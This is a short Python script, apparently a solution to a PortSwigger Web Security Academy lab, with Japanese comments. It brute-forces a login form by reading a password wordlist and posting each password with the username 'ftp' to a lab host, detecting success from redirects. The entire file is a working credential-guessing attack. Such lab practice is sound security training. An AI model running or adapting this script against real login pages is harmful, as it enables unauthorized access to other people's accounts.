from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parent.parent
PASSWORDS_FILE = ROOT / "wordlists" / "passwords.txt"

URL = "0a1c000f04e725b280e1357600e700fe.web-security-academy.net"

with open(PASSWORDS_FILE, "r") as f:
    passwords = f.read().splitlines()

print("[*] パスワードリストによる総当たりを開始します")

for password in passwords:
    data = {
        "username": 'ftp',
        "password": password
    }

    # リダイレクトの有無で成否を判定するため、自動追従は無効化する
    response = requests.post(URL, data=data, allow_redirects=False, timeout=10)

    is_redirect = response.is_redirect or response.is_permanent_redirect
    location = response.headers.get("Location", "-")

    print(
        f"password: {password:15} | redirect: {is_redirect!s:5} "
        f"| status: {response.status_code} | location: {location}"
    )
